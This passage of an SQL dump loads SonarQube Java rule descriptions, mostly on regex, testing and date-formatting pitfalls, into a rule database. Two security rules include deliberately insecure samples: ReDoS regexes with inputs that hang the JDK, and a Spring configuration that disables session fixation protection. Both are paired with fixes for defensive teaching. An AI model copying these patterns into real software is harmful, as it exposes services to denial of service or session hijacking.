  exactly one <code>b</code> char per repetition of the group. </li>
  <li> Optimize regular expressions with <code>possessive quantifiers</code> and <code>atomic grouping</code>. </li>
  <li> Use negated character classes instead of <code>.</code> to exclude separators where applicable. For example the quadratic regex
  <code>.*_.*</code> can be made linear by changing it to <code>[^_]*_.*</code> </li>
</ul>
<p>Sometimes it''s not possible to rewrite the regex to be linear while still matching what you want it to match. Especially when using partial
matches, for which it is quite hard to avoid quadratic runtimes. In those cases consider the following approaches:</p>
<ul>
  <li> Solve the problem without regular expressions </li>
  <li> Use an alternative non-backtracking regex implementations such as Google''s <a href="https://github.com/google/re2">RE2</a> or <a
  href="https://github.com/google/re2j">RE2/J</a>. </li>
  <li> Use multiple passes. This could mean pre- and/or post-processing the string manually before/after applying the regular expression to it or
  using multiple regular expressions. One example of this would be to replace <code>str.split("\\s*,\\s*")</code> with <code>str.split(",")</code> and
  then trimming the spaces from the strings as a second step. </li>
  <li> When using <code>Matcher.find()</code>, it is often possible to make the regex infallible by making all the parts that could fail optional,
  which will prevent backtracking. Of course this means that you''ll accept more strings than intended, but this can be handled by using capturing
  groups to check whether the optional parts were matched or not and then ignoring the match if they weren''t. For example the regex <code>x*y</code>
  could be replaced with <code>x*(y)?</code> and then the call to <code>matcher.find()</code> could be replaced with <code>matcher.find() &amp;&amp;
  matcher.group(1) != null</code>. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>The first regex evaluation will never end in <code>JDK</code> &lt;= 9 and the second regex evaluation will never end in any versions of the
<code>JDK</code>:</p>
<pre>
java.util.regex.Pattern.compile("(a+)+").matcher(
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaa!").matches(); // Sensitive

java.util.regex.Pattern.compile("(h|h|ih(((i|a|c|c|a|i|i|j|b|a|i|b|a|a|j))+h)ahbfhba|c|i)*").matcher(
"hchcchicihcchciiicichhcichcihcchiihichiciiiihhcchi"+
"cchhcihchcihiihciichhccciccichcichiihcchcihhicchcciicchcccihiiihhihihihi"+
"chicihhcciccchihhhcchichchciihiicihciihcccciciccicciiiiiiiiicihhhiiiihchccch"+
"chhhhiiihchihcccchhhiiiiiiiicicichicihcciciihichhhhchihciiihhiccccccciciihh"+
"ichiccchhicchicihihccichicciihcichccihhiciccccccccichhhhihihhcchchihih"+
"iihhihihihicichihiiiihhhhihhhchhichiicihhiiiiihchccccchichci").matches(); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Possessive quantifiers do not keep backtracking positions, thus can be used, if possible, to avoid performance issues:</p>
<pre>
java.util.regex.Pattern.compile("(a+)++").matcher(
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaa!").matches(); // Compliant

java.util.regex.Pattern.compile("(h|h|ih(((i|a|c|c|a|i|i|j|b|a|i|b|a|a|j))+h)ahbfhba|c|i)*+").matcher(
"hchcchicihcchciiicichhcichcihcchiihichiciiiihhcchi"+
"cchhcihchcihiihciichhccciccichcichiihcchcihhicchcciicchcccihiiihhihihihi"+
"chicihhcciccchihhhcchichchciihiicihciihcccciciccicciiiiiiiiicihhhiiiihchccch"+
"chhhhiiihchihcccchhhiiiiiiiicicichicihcciciihichhhhchihciiihhiccccccciciihh"+
"ichiccchhicchicihihccichicciihcichccihhiciccccccccichhhhihihhcchchihih"+
"iihhihihihicichihiiiihhhhihhhchhichiicihhiiiiihchccccchichci").matches(); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/400.html">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li>
  <li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">owasp.org</a> - OWASP Regular expression Denial
  of Service - ReDoS </li>
  <li> <a href="https://stackstatus.net/post/147710624694/outage-postmortem-july-20-2016">stackstatus.net</a> - Outage Postmortem - July 20, 2016
  </li>
  <li> <a href="https://www.regular-expressions.info/catastrophic.html">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic
  Backtracking </li>
  <li> <a
  href="https://docs.microsoft.com/en-us/dotnet/standard/base-types/backtracking-in-regular-expressions#backtracking-with-nested-optional-quantifiers">docs.microsoft.com</a> - Backtracking with Nested Optional Quantifiers </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5853', 'Consecutive AssertJ "assertThat" statements should be chained', 'sonarqube', 'Code Smell', '<p>AssertJ assertions methods targeting the same object can be chained instead of using multiple <code>assertThat</code>. It avoids duplication and
increases the clarity of the code.</p>
<p>This rule raises an issue when multiples <code>assertThat</code> target the same tested value.</p>
<h2>Noncompliant Code Example</h2>
<pre>
assertThat(someList).hasSize(3);
assertThat(someList).contains("something");
</pre>
<h2>Compliant Solution</h2>
<pre>
assertThat(someList)
  .hasSize(3)
  .contains("something");
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5854', 'Regexes containing characters subject to normalization should use the CANON_EQ flag', 'sonarqube', 'Code Smell', '<p>Characters like <code>''é''</code> can be expressed either as a single code point or as a cluster of the letter <code>''e''</code> and a combining
accent mark. Without the <code>CANON_EQ</code> flag, a regex will only match a string in which the characters are expressed in the same way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String s = "e";
Pattern p = Pattern.compile("é|ë|è"); // Noncompliant
System.out.println(p.matcher(s).replaceAll("e")); // print ''é''
</pre>
<h2>Compliant Solution</h2>
<pre>
String s = "e";
Pattern p = Pattern.compile("é|ë|è", Pattern.CANON_EQ);
System.out.println(p.matcher(s).replaceAll("e")); // print ''e''
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5855', 'Regex alternatives should not be redundant', 'sonarqube', 'Bug', '<p>If an alternative in a regular expression only matches things that are already matched by another alternative, that alternative is redundant and
serves no purpose.</p>
<p>In the best case this means that the offending subpattern is merely redundant and should be removed. In the worst case it''s a sign that this regex
does not match what it was intended to match and should be reworked.</p>
<h2>Noncompliant Code Example</h2>
<pre>
"[ab]|a"   // The "|a" is redundant because "[ab]" already matches "a"
".*|a"     // .* matches everything, so any other alternative is redundant
</pre>
<h2>Compliant Solution</h2>
<pre>
"[ab]"
".*"
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5856', 'Regular expressions should be syntactically valid', 'sonarqube', 'Bug', '<p>Regular expressions have their own syntax that is understood by regular expression engines. Those engines will throw an exception at runtime if
they are given a regular expression that does not conform to that syntax.</p>
<p>To avoid syntax errors, special characters should be escaped with backslashes when they are intended to be matched literally and references to
capturing groups should use the correctly spelled name or number of the group.</p>
<p>To match a literal string, rather than a regular expression, either all special characters should be escaped or the <code>Pattern.LITERAL</code>
flag or methods that don''t use regular expressions should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Pattern.compile("([");
str.matches("([");
str.replaceAll("([", "{");
str.matches("(\\w+-(\\d+)");
</pre>
<h2>Compliant Solution</h2>
<pre>
Pattern.compile("\\(\\[");
Pattern.compile("([", Pattern.LITERAL);
str.equals("([");
str.replace("([", "{");
str.matches("(\\w+)-(\\d+)");
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5857', 'Character classes should be preferred over reluctant quantifiers in regular expressions', 'sonarqube', 'Code Smell', '<p>Using reluctant quantifiers (also known as lazy or non-greedy quantifiers) in patterns can often lead to needless backtracking, making the regex
needlessly inefficient and potentially vulnerable to <a href="https://www.regular-expressions.info/catastrophic.html">catastrophic backtracking</a>.
Particularly when using <code>.*?</code> or <code>.+?</code> to match anything up to some terminating character, it is usually a better idea to
instead use a greedily or possessively quantified negated character class containing the terminating character. For example <code>&lt;.+?&gt;</code>
should be replaced with <code>&lt;[^&gt;]++&gt;</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;.+?&gt;
".*?"
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;[^&gt;]++&gt;
"[^"]*+"
</pre>
<p>or</p>
<pre>
&lt;[^&gt;]+&gt;
"[^"]*"
</pre>
<h2>Exceptions</h2>
<p>This rule only applies in cases where the reluctant quantifier can easily be replaced with a negated character class. That means the repetition has
to be terminated by a single character or character class. Patterns such as the following, where the alternatives without reluctant quantifiers are
more complicated, are therefore not subject to this rule:</p>
<pre>
&lt;!--.*?--&gt;
/*.*?*/
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5860', 'Names of regular expressions named groups should be used', 'sonarqube', 'Code Smell', '<p>Why use named groups only to never use any of them later on in the code?</p>
<p>This rule raises issues every time named groups are:</p>
<ul>
  <li> defined but never called anywhere in the code through their name; </li>
  <li> defined but called elsewhere in the code by their number instead. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
String date = "01/02";

Pattern datePattern = Pattern.compile("(?&lt;month&gt;[0-9]{2})/(?&lt;year&gt;[0-9]{2})");
Matcher dateMatcher = datePattern.matcher(date);

if (dateMatcher.matches()) {
  checkValidity(dateMatcher.group(1), dateMatcher.group(2));  // Noncompliant - numbers instead of names of groups are used
  checkValidity(dateMatcher.group("day")); // Noncompliant - there is no group called "day"
}

// ...

String score = "14:1";

Pattern scorePattern = Pattern.compile("(?&lt;player1&gt;[0-9]+):(?&lt;player2&gt;[0-9]+)"); // Noncompliant - named groups are never used
Matcher scoreMatcher = scorePattern.matcher(score);

if (scoreMatcher.matches()) {
  checkScore(score);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
String date = "01/02";

Pattern datePattern = Pattern.compile("(?&lt;month&gt;[0-9]{2})/(?&lt;year&gt;[0-9]{2})");
Matcher dateMatcher = datePattern.matcher(date);

if (dateMatcher.matches()) {
  checkValidity(dateMatcher.group("month"), dateMatcher.group("year"));
}

// ...

String score = "14:1";

Pattern scorePattern = Pattern.compile("(?&lt;player1&gt;[0-9]+):(?&lt;player2&gt;[0-9]+)");
Matcher scoreMatcher = scorePattern.matcher(score);

if (scoreMatcher.matches()) {
  checkScore(scoreMatcher.group("player1"));
  checkScore(scoreMatcher.group("player2"));
}
</pre>
<p>Or, using dedicated variables instead of group names:</p>
<pre>
String score = "14:1";

String player = "([0-9]+)";
String gameScore = player + ":" + player;

Pattern scorePattern = Pattern.compile(gameScore);
Matcher scoreMatcher = scorePattern.matcher(score);

if (scoreMatcher.matches()) {
  checkScore(score);
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5863', 'Assertions should not compare an object to itself', 'sonarqube', 'Bug', '<p>Assertions comparing an object to itself are more likely to be bugs due to developer''s carelessness.</p>
<p>This rule raises an issue when the actual expression matches the expected expression.</p>
<h2>Noncompliant Code Example</h2>
<pre>
assertThat(actual).isEqualTo(actual); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
assertThat(actual).isEqualTo(expected);
</pre>
<h2>Exceptions</h2>
<p>In a unit test validating the <code>equals(...)</code> and <code>hashCode()</code> methods, it''s legitimate to compare an object to itself. This
rule does not raise an issue for <code>isEqualTo</code>, <code>assertEquals</code> or <code>hasSameHashCodeAs</code> when the unit test name contains
(case insensitive): <code>equal</code>, <code>hash_?code</code>, <code>object_?method</code>. For example, in tests with the following names:
<code>test_equals</code>, <code>testEqual</code>, <code>test_hashCode</code>, <code>test_hash_code</code>, <code>test_object_methods</code>.</p>
<pre>
class MyClassTest {
  @Test
  void test_equals_and_hash_code() {
    MyClass obj = new MyClass();
    assertThat(obj).isEqualTo(obj); // Compliant
    assertThat(obj).hasSameHashCodeAs(obj); // Compliant
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5866', 'Case insensitive Unicode regular expressions should enable the “UNICODE_CASE” flag', 'sonarqube', 'Bug', '<p>By default case insensitivity only affects letters in the ASCII range. This can be changed by either passing <code>Pattern.UNICODE_CASE</code> or
<code>Pattern.UNICODE_CHARACTER_CLASS</code> as an argument to <code>Pattern.compile</code> or using <code>(?u)</code> or <code>(?U)</code> within the
regex.</p>
<p>If not done, regular expressions involving non-ASCII letters will still handle those letters as being case sensitive.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Pattern.compile("söme pättern", Pattern.CASE_INSENSITIVE);
str.matches("(?i)söme pättern");
str.matches("(?i:söme) pättern");
</pre>
<h2>Compliant Solution</h2>
<pre>
Pattern.compile("söme pättern", Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CASE);
str.matches("(?iu)söme pättern");
str.matches("(?iu:söme) pättern");

// UNICODE_CHARACTER_CLASS implies UNICODE_CASE
Pattern.compile("söme pättern", Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CHARACTER_CLASS);
str.matches("(?iU)söme pättern");
str.matches("(?iU:söme) pättern");
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5867', 'Unicode-aware versions of character classes should be preferred', 'sonarqube', 'Code Smell', '<p>When using POSIX classes like <code>p{Alpha}</code> without the <code>UNICODE_CHARACTER_CLASS</code> flag or when using hard-coded character
classes like <code>"[a-zA-Z]"</code>, letters outside of the ASCII range, such as umlauts, accented letters or letter from non-Latin languages, won''t
be matched. This may cause code to incorrectly handle input containing such letters.</p>
<p>To correctly handle non-ASCII input, it is recommended to use Unicode classes like <code>p{IsAlphabetic}</code>. When using POSIX classes, Unicode
support should be enabled by either passing <code>Pattern.UNICODE_CHARACTER_CLASS</code> as a flag to <code>Pattern.compile</code> or by using
<code>(?U)</code> inside the regex.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Pattern.compile("[a-zA-Z]");
Pattern.compile("\\p{Alpha}");
</pre>
<h2>Compliant Solution</h2>
<pre>
Pattern.compile("\\p{IsAlphabetic}"); // matches all letters from all languages
Pattern.compile("\\p{IsLatin}"); // matches latin letters, including umlauts and other non-ASCII variations
Pattern.compile("\\p{Alpha}", Pattern.UNICODE_CHARACTER_CLASS);
Pattern.compile("(?U)\\p{Alpha}");
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5868', 'Unicode Grapheme Clusters should be avoided inside regex character classes', 'sonarqube', 'Bug', '<p>When placing Unicode <a href="https://unicode.org/glossary/#grapheme_cluster">Grapheme Clusters</a> (characters which require to be encoded in
multiple <a href="https://unicode.org/glossary/#code_point">Code Points</a>) inside a character class of a regular expression, this will likely lead
to unintended behavior.</p>
<p>For instance, the grapheme cluster <code>c̈</code> requires two code points: one for <code>''c''</code>, followed by one for the <em>umlaut</em>
modifier <code>''u{0308}''</code>. If placed within a character class, such as <code>[c̈]</code>, the regex will consider the character class being the
enumeration <code>[cu{0308}]</code> instead. It will, therefore, match every <code>''c''</code> and every <em>umlaut</em> that isn''t expressed as a
single codepoint, which is extremely unlikely to be the intended behavior.</p>
<p>This rule raises an issue every time Unicode Grapheme Clusters are used within a character class of a regular expression.</p>
<h2>Noncompliant Code Example</h2>
<pre>
"cc̈d̈d".replaceAll("[c̈d̈]", "X"); // Noncompliant, print "XXXXXX" instead of expected "cXXd".
</pre>
<h2>Compliant Solution</h2>
<pre>
"cc̈d̈d".replaceAll("c̈|d̈", "X"); // print "cXXd"
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5869', 'Character classes in regular expressions should not contain the same character twice', 'sonarqube', 'Code Smell', '<p>Character classes in regular expressions are a convenient way to match one of several possible characters by listing the allowed characters or
ranges of characters. If the same character is listed twice in the same character class or if the character class contains overlapping ranges, this
has no effect.</p>
<p>Thus duplicate characters in a character class are either a simple oversight or a sign that a range in the character class matches more than is
intended or that the author misunderstood how character classes work and wanted to match more than one character. A common example of the latter
mistake is trying to use a range like <code>[0-99]</code> to match numbers of up to two digits, when in fact it is equivalent to <code>[0-9]</code>.
Another common cause is forgetting to escape the ''<code>-</code>'' character, creating an unintended range that overlaps with other characters in the
character class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
str.matches("[0-99]") // Noncompliant, this won''t actually match strings with two digits
str.matches("[0-9.-_]") // Noncompliant, .-_ is a range that already contains 0-9 (as well as various other characters such as capital letters)
</pre>
<h2>Compliant Solution</h2>
<pre>
str.matches("[0-9]{1,2}")
str.matches("[0-9.\\-_]")
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5876', 'A new session should be created during user authentication', 'sonarqube', 'Vulnerability', '<p>Session fixation attacks occur when an attacker can force a legitimate user to use a session ID that he knows. To avoid fixation attacks, it''s a
good practice to generate a new session each time a user authenticates and delete/invalidate the existing session (the one possibly known by the
attacker).</p>
<h2>Noncompliant Code Example</h2>
<p>In a Spring Security''s context, session fixation protection is enabled by default but can be disabled with <code>sessionFixation().none()</code>
method:</p>
<pre>
@Override
protected void configure(HttpSecurity http) throws Exception {
   http.sessionManagement()
     .sessionFixation().none(); // Noncompliant: the existing session will continue
}
</pre>
<h2>Compliant Solution</h2>
<p>In a Spring Security''s context, session fixation protection can be enabled as follows:</p>
<pre>
@Override
protected void configure(HttpSecurity http) throws Exception {
  http.sessionManagement()
     .sessionFixation().newSession(); // Compliant: a new session is created without any of the attributes from the old session being copied over

  // or

  http.sessionManagement()
     .sessionFixation().migrateSession(); // Compliant: a new session is created, the old one is invalidated and the attributes from the old session are copied over.
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication">OWASP Top 10 2017 Category A2</a> -
  Broken Authentication </li>
  <li> <a href="https://www.owasp.org/index.php/Session_fixation">OWASP Sesssion Fixation</a> </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/384.html">MITRE, CWE-384</a> - Session Fixation </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5917', 'DateTimeFormatters should not use mismatched year and week numbers', 'sonarqube', 'Bug', '<p>When creating a <code>DateTimeFormatter</code> using the <code>WeekFields.weekBasedYear()</code> temporal field, the resulting year number may be
off by 1 at the beginning of a new year (when the date to format is in a week that is shared by two consecutive years). </p>
<p>Using this year number in combination with an incompatible week temporal field yields a result that may be confused with the first week of the
previous year.</p>
<p>Instead, when paired with a week temporal field, the week-based year should only be used with the week of week-based year temporal field
<code>WeekFields.weekOfWeekBasedYear()</code>.</p>
<p>Alternatively the temporal field <code>ChronoField.ALIGNED_WEEK_OF_YEAR</code> can be used together with a regular year (but not the week based
year).</p>
<h2>Noncompliant Code Example</h2>
<pre>
new DateTimeFormatterBuilder()
      .appendValue(ChronoField.YEAR, 4) // Noncompliant: using week of week-based year with regular year
      .appendLiteral(''-'')
      .appendValue(WeekFields.ISO.weekOfWeekBasedYear(), 2)
      .toFormatter();

new DateTimeFormatterBuilder()
      .appendValue(ChronoField.YEAR_OF_ERA, 4) // Noncompliant: using week of week-based year with regular year
      .appendLiteral(''-'')
      .appendValue(WeekFields.ISO.weekOfWeekBasedYear(), 2)
      .toFormatter();

new DateTimeFormatterBuilder()
      .appendValue(WeekFields.ISO.weekBasedYear(), 4) // Noncompliant: using aligned week of year with week-based year
      .appendLiteral(''-'')
      .appendValue(ChronoField.ALIGNED_WEEK_OF_YEAR, 2)
      .toFormatter();
</pre>
<p>Here the first two formatters would wrongly format the 1st of January 2016 as "2016-53" while the last one would format it as "2015-01"</p>
<h2>Compliant Solution</h2>
<pre>
new DateTimeFormatterBuilder()
      .appendValue(WeekFields.ISO.weekBasedYear(), 4)
      .appendLiteral(''-'')
      .appendValue(WeekFields.ISO.weekOfWeekBasedYear(), 2)
      .toFormatter();

new DateTimeFormatterBuilder()
      .appendValue(ChronoField.YEAR, 4)
      .appendLiteral(''-'')
      .appendValue(ChronoField.ALIGNED_WEEK_OF_YEAR, 2)
      .toFormatter();

new DateTimeFormatterBuilder()
      .appendValue(ChronoField.YEAR_OF_ERA, 4)
      .appendLiteral(''-'')
      .appendValue(ChronoField.ALIGNED_WEEK_OF_YEAR, 2)
      .toFormatter();
</pre>
<p>Here the first formatter would format the 1st of January 2016 as "2015-53" while the last two would produce "2016-01", both of which are correct
depending on how you count the weeks.</p>
<h2>Exceptions</h2>
<p>No issue is raised when week-based year is not used in combination with a week temporal field.</p>
<p>Similarly, no issue is raised if week of week-based year is not used in combination with a year temporal field.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5958', 'AssertJ "assertThatThrownBy" should not be used alone', 'sonarqube', 'Code Smell', '<p>Unlike similar AssertJ methods testing exceptions (<code>assertThatCode()</code>, <code>assertThatExceptionOfType()</code>, ...), the
<code>assertThatThrownBy()</code> method can be used alone, failing if the code did not raise any exception.</p>
<p>Still, only testing that an exception was raised is not enough to guarantee that it was the expected one, and you should test the exception type or
content further. In addition, it will make explicit what you are expecting, without relying on side-effects.</p>
<p>This rule raises an issue when <code>assertThatThrownBy</code> is used, without testing the exception further.</p>
<h2>Noncompliant Code Example</h2>
<pre>
assertThatThrownBy(() -&gt; shouldThrow()); // Noncompliant, is it really the exception you expected?
</pre>
<h2>Compliant Solution</h2>
<pre>
assertThatThrownBy(() -&gt; shouldThrow()).isInstanceOf(IOException.class);
//or
assertThatThrownBy(() -&gt; shouldThrow()).hasMessage("My exception");
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5960', 'Assertions should not be used in production code', 'sonarqube', 'Bug', '<p>Assertions are intended to be used in <strong>test</strong> code, but not in <strong>production</strong> code. It is confusing, and might lead to
<code>ClassNotFoundException</code> when the build tools only provide the required dependency in test scope.</p>
<p>In addition, assertions will throw a sub-class of <code>Error</code>: <code>AssertionError</code>, which should be avoided in production code.</p>
<p>This rule raises an issue when any assertion intended to be used in test is used in production code.</p>
<p>Supported frameworks:</p>
<ul>
  <li> JUnit </li>
  <li> FestAssert </li>
  <li> AssertJ </li>
</ul>
<p>Note: this does not apply for <code>assert</code> from Java itself or if the source code package name is related to tests (contains:
<code>test</code> or <code>assert</code> or <code>junit</code>).</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5961', 'Test methods should not contain too many assertions', 'sonarqube', 'Code Smell', '<p>A common good practice is to write test methods targeting only one logical concept, that can only fail for one reason.</p>
<p>While it might make sense to have more than one assertion to test one concept, having too many is a sign that a test became too complex and should
be refactored to multiples ones.</p>
<p>This rule will report any test method containing more than a given number of assertion.</p>
<h2>Noncompliant Code Example</h2>
<p>With a parameter of 2.</p>
<pre>
@Test
void test() { // Refactor this method.
  assertEquals(1, f(1));
  assertEquals(2, f(2));
  assertEquals(3, g(1));
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void test_f() {
  assertEquals(1, f(1));
  assertEquals(2, f(2));
}
void test_g() {
  assertEquals(3, g(1));
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5967', 'Tests method should not be annotated with competing annotations', 'sonarqube', 'Bug', '<p>Annotating unit tests with more than one test-related annotation is not only useless but could also result in unexpected behavior like failing
tests or unwanted side-effects.</p>
<p>This rule reports an issue when a test method is annotated with more than one of the following competing annotation:</p>
<ul>
  <li> @Test </li>
  <li> @RepeatedTest </li>
  <li> @ParameterizedTest </li>
  <li> @TestFactory </li>
  <li> @TestTemplate </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
@RepeatedTest(2) // Noncompliant, this test will be repeated 3 times
void test() { }

@ParameterizedTest
@Test
@MethodSource("methodSource")
void test2(int argument) { } // Noncompliant, this test will fail with ParameterResolutionException
</pre>
<h2>Compliant Solution</h2>
<pre>
@RepeatedTest(2)
void test() { }

@ParameterizedTest
@MethodSource("methodSource")
void test2(int argument) { }
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5969', 'Mocking all non-private methods of a class should be avoided', 'sonarqube', 'Code Smell', '<p>If you end up mocking every non-private method of a class in order to write tests, it is a strong sign that your test became too complex, or that
you misunderstood the way you are supposed to use the mocking mechanism.</p>
<p>You should either refactor the test code into multiple units, or consider using the class itself, by either directly instantiating it, or creating
a new one inheriting from it, with the expected behavior.</p>
<p>This rule reports an issue when every member of a given class are mocked.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
void test_requiring_MyClass() {
  MyClass myClassMock = mock(MyClass.class); // Noncompliant
  when(myClassMock.f()).thenReturn(1);
  when(myClassMock.g()).thenReturn(2);
  //...
}

abstract class MyClass {
  abstract int f();
  abstract int g();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
void test_requiring_MyClass() {
  MyClass myClass = new MyClassForTest();
  //...
}

class MyClassForTest extends MyClass {

  @Override
  int f() {
    return 1;
  }

  @Override
  int g() {
    return 2;
  }
}
</pre>
<p>or</p>
<pre>
@Test
void test_requiring_f() {
  MyClass myClassMock = mock(MyClass.class);
  when(myClassMock.f()).thenReturn(1);
  //...
}

@Test
void test_requiring_g() {
  MyClass myClassMock = mock(MyClass.class);
  when(myClassMock.g()).thenReturn(2);
  //...
}

abstract class MyClass {
  abstract int f();
  abstract int g();
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5970', 'Spring''s ModelAndViewAssert assertions should be used instead of other assertions', 'sonarqube', 'Code Smell', '<p>The Spring framework comes with dedicated classes to help writing better and simpler unit tests. In particular, when testing applications built on
top of Spring MVC, it is recommended to use Spring''s <code>ModelAndViewAssert</code> assertions class, instead of manually testing MVC''s
properties.</p>
<p>&nbsp;</p>
<p>This rule raises an issue when&nbsp;Spring''s <code>ModelAndViewAssert</code> assertions should be used instead of manual testing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
ModelAndView mav = getMyModelAndView();

Assert.assertEquals("register", mav.getViewName());
Assert.assertTrue((Boolean) mav.getModelMap().get("myAttribute"));
Assert.assertFalse((Boolean) mav.getModelMap().get("myAttribute"));
Assert.assertEquals(myObject, mav.getModelMap().get("myAttribute"));
</pre>
<h2>Compliant Solution</h2>
<pre>
ModelAndView mav = getMyModelAndView();

ModelAndViewAssert.assertViewName(mav, "register");
ModelAndViewAssert.assertModelAttributeValue(mav, "myAttribute", Boolean.TRUE);
ModelAndViewAssert.assertModelAttributeValue(mav, "myAttribute", Boolean.FALSE);
ModelAndViewAssert.assertModelAttributeValue(mav, "myAttribute", myObject);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.spring.io/spring-framework/docs/current/spring-framework-reference/testing.html#unit-testing-spring-mvc">Unit Testing
  Spring MVC</a> </li>
  <li> <a
  href="https://docs.spring.io/spring-framework/docs/5.2.8.RELEASE/javadoc-api/org/springframework/test/web/ModelAndViewAssert.html">ModelAndViewAssert Javadoc</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5973', 'Tests should be stable', 'sonarqube', 'Code Smell', '<p>Unstable / flaky tests are tests which sometimes pass and sometimes fail, without any code change. Obviously, they slow down developments when
engineers have to rerun failed tests. However the real problem is that you can''t completely trust these tests, they might fail for many different
reasons and you don''t know if any of them will happen in production.</p>
<p>Some tools, such as TestNG, enable developers to automatically retry flaky tests. This might be ok as a temporary solution, but it should
definitely be fixed. The more flaky tests you add, the more chances there are for a bug to arrive in production.</p>
<p>This rule raises an issue when the annotation <code>org.testng.annotations.Test</code> is given a <code>successPercentage</code> argument with a
value lower than <code>100</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import org.testng.annotations.Test;

public class PercentageTest {
    @Test(successPercentage = 80, invocationCount = 10)  // Noncompliant. The test is allowed to fail 2 times.
    public void flakyTest() {
    }
}
</pre>
<h2>See</h2>
<ul>
